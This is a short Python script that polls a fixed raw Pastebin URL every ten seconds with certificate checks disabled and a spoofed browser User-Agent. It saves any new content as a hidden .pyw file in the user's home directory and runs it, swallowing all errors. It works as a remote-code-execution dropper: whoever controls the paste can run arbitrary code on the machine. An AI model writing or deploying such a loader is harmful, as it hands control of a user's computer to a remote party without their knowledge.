# Downloads a python script from pastebin (or other paste website)

import sys, subprocess, urllib.request, time, ssl, os

#ricpath = os.path.expanduser("~") + "/ricrun.pyw"
url = "https://pastebin.com/raw/SjRfdFmE"
dlpath = os.path.expanduser("~") + "/pasterun.pyw"

prevdata = ''

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

while True:
    try:
    #if 1:
        # Open the URL as Browser, not as python urllib
        #page=requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
        page = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        infile=urllib.request.urlopen(page, context=context).read()
        data = infile.decode('ISO-8859-1') # Read the content as string decoded with ISO-8859-1
        #data = page.content

        # print("Refreshing...")

        if data != prevdata:
            with open(dlpath, 'w', encoding='utf-8') as fw:
                fw.write(data)
            #splitdata = data.splitlines(keepends=False)

            # print(splitdata)

            # Run the downloaded python code
            try:
                subprocess.run([sys.executable, dlpath], shell=False)
            except Exception:
                pass

            prevdata = data

    except Exception:
        pass

    time.sleep(10)
